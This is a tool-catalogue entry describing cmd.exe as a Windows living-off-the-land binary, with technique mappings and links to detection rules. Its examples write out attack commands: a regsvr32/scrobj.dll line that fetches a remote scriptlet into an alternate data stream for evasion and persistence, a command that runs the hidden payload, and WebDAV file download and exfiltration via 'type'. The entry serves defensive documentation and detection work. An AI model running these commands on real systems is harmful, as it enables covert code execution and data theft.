---
id: windows-ads-cmd
namespace: windows:ads:cmd
name: cmd
description: 'The command-line interpreter in Windows Located at: C:\Windows\System32\cmd.exe;
  C:\Windows\SysWOW64\cmd.exe.'
author: Ye Yint Min Thu Htut
version: 1.0.0
capabilities:
- system.file.alternate-data-stream
- network.transfer.download
- network.transfer.upload
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- cmd
parameters: []
features:
- file-system
- local
- network-intensive
- pipes-stdin
- pipes-stdout
- streaming
execution:
  template: cmd
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Add content to an Alternate Data Stream (ADS). (Can be used to evade
    defensive countermeasures or to hide as a persistence mechanism)
  command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll >
    {PATH}:payload.bat
- description: Execute payload.bat stored in an Alternate Data Stream (ADS). (Can
    be used to evade defensive countermeasures or to hide as a persistence mechanism)
  command: cmd.exe - < {PATH}:payload.bat
- description: Downloads a specified file from a WebDAV server to the target file.
    (Download/copy a file from a WebDAV server)
  command: type {PATH_SMB} > {PATH_ABSOLUTE}
- description: Uploads a specified file to a WebDAV server. (Upload a file to a WebDAV
    server)
  command: type {PATH_ABSOLUTE} > {PATH_SMB}
references:
- label: '1143824979139579904'
  url: https://twitter.com/yeyint_mth/status/1143824979139579904
- label: '1601408154780446721'
  url: https://twitter.com/Mr_0rng/status/1601408154780446721
- label: a-new-lolbin-using-the-windows-type-command-to-upl
  url: https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22
- label: type
  url: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type
techniques:
- defense-evasion
- execution
- exfiltration
mitre_ids:
- T1564.004
- T1059.003
- T1105
- T1048.003
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml
- type: ioc
  description: cmd.exe executing files from alternate data streams.
- type: ioc
  description: cmd.exe creating/modifying file contents in an alternate data stream.
install:
- method: choco
  package_name: cmd
  commands:
  - choco install cmd
---

# cmd

cmd is a Windows LOLBin. The command-line interpreter in Windows Located at: C:\Windows\System32\cmd.exe; C:\Windows\SysWOW64\cmd.exe.
